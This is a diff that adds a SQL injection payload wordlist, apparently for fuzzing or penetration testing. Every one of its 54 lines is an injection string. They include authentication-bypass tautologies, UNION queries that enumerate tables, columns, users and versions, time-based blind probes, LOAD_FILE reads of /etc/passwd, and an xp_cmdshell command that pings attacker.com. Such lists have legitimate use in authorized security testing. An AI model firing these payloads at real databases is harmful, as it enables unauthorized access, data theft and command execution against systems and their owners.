@@ -1,0 +1,54 @@
+'
+"
+'
+''
+"
+'
+'
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1 /*
+admin' --
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT @@version--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+' OR pg_sleep(5)--
+' OR pg_sleep(5)--
+' OR BENCHMARK(5000000,MD5(1))--
+' AND '1'='1
+' AND '1'='2
+'; EXEC xp_cmdshell('ping attacker.com')--
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
+' UNION SELECT 1,2,@@hostname--
+' UNION SELECT 1,2,database()--
+' UNION SELECT 1,2,user()--
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
+' HAVING 1=1--
+') OR 1=1--
+')) OR 1=1--
+' OR 1=1 LIMIT 1--
+' OR 1=1 ORDER BY 1--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 100--
+' AND 1=2 UNION ALL SELECT 1,2,3--
+' AND 1=2 UNION SELECT 1,2,3--
+' OR 'x'='x
+' AND 'x'='y
+OR 1=1
